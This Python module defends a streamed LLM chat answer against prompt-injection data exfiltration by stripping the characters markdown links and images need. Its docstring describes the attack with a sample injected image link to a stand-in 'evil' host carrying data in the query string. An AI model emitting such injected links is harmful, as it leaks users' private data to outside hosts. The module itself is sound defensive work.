"""Make a streamed LLM answer unable to load or link anything when rendered as markdown.

Used where the prompt mixes private data with untrusted web text: a prompt-injected image
(`![x](//evil/?d=...)`, or the reference form `![x][r]` + `[r]: ...`) would make the browser send that
data out. Rather than blocklisting markdown syntax, the characters links and images need are removed:
square brackets go, `://` / `www.` are broken, a space follows any `<` before a letter (no
`<http:...>` / `<mailto:...>` autolinks) and any `@` inside a word (no email autolinks). Raw HTML needs no handling
because the chat renderer doesn't render it. Every rule is a fixed-width text rewrite, so streaming
only holds back the last few characters in case a pattern spans two chunks.
"""

import re

_WWW = re.compile(r"www\.", re.IGNORECASE)
_ANGLE_AUTOLINK = re.compile(r"<(?=[A-Za-z])")
_EMAIL_AT = re.compile(r"(?<=\w)@(?=\w)")
# Longest pattern ("www.") minus one: enough tail to finish a pattern split across chunks.
HOLD = 3


def sanitize(text: str) -> str:
    """Idempotent: sanitizing already-sanitized text changes nothing."""
    text = text.replace("[", "").replace("]", "")
    text = text.replace("://", ": ")
    text = _WWW.sub("www ", text)
    text = _ANGLE_AUTOLINK.sub("< ", text)
    return _EMAIL_AT.sub("@ ", text)


class AnswerSanitizer:
    def __init__(self) -> None:
        self._buffer = ""

    def feed(self, chunk: str) -> str:
        """Sanitized text that is safe to emit now; the last few characters wait for more input."""
        self._buffer = sanitize(self._buffer + chunk)
        ready, self._buffer = self._buffer[:-HOLD], self._buffer[-HOLD:]
        return ready

    def flush(self) -> str:
        rest, self._buffer = self._buffer, ""
        return sanitize(rest)
